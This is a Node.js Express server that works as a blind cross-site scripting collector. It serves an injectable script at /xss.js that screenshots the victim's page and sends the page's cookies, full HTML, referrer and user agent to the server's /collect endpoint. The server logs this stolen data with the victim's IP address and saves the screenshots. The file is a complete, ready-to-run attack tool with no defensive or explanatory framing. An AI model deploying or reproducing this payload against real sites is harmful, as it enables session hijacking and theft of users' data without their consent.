const express = require('express');
const fs = require('fs');
const bodyParser = require('body-parser');
const app = express();
const PORT = process.env.PORT || 3000;

// Create "screenshots" folder if not exists
if (!fs.existsSync('screenshots')) {
  fs.mkdirSync('screenshots');
}

app.use(bodyParser.json({ limit: '15mb' }));
app.use(bodyParser.urlencoded({ extended: true }));

// Serve the XSS payload at /xss.js
app.get('/xss.js', (req, res) => {
  res.setHeader('Content-Type', 'application/javascript');
  res.send(`
    (function(){
      var s = document.createElement('script');
      s.src = 'https://html2canvas.hertzen.com/dist/html2canvas.min.js';
      s.onload = function() {
        html2canvas(document.body).then(function(canvas) {
          fetch('https://${req.headers.host}/collect', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              screenshot: canvas.toDataURL('image/png'),
              cookies: document.cookie,
              userAgent: navigator.userAgent,
              referer: document.referrer,
              origin: location.origin,
              html: document.documentElement.outerHTML,
              iframe: window.self !== window.top,
              time: new Date().toISOString()
            })
          });
        });
      };
      document.head.appendChild(s);
    })();
  `);
});

// Endpoint to receive data
app.post('/collect', (req, res) => {
  const {
    screenshot, cookies, userAgent, referer,
    origin, html, iframe, time
  } = req.body;

  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

  let screenshotPath = null;
  if (screenshot) {
    const base64Data = screenshot.replace(/^data:image\/png;base64,/, "");
    screenshotPath = `screenshots/screenshot-${Date.now()}.png`;
    fs.writeFileSync(screenshotPath, base64Data, 'base64');
  }

  const logEntry = {
    ip,
    userAgent,
    referer,
    origin,
    cookies,
    html,
    iframe,
    time,
    screenshot: screenshotPath
  };

  console.log("🚨 Blind XSS Triggered:", logEntry);
  fs.appendFileSync('logs.txt', JSON.stringify(logEntry) + "\n");

  res.status(200).send('OK');
});

// Start server
app.listen(PORT, () => {
  console.log(`✅ Server is running on port ${PORT}`);
});
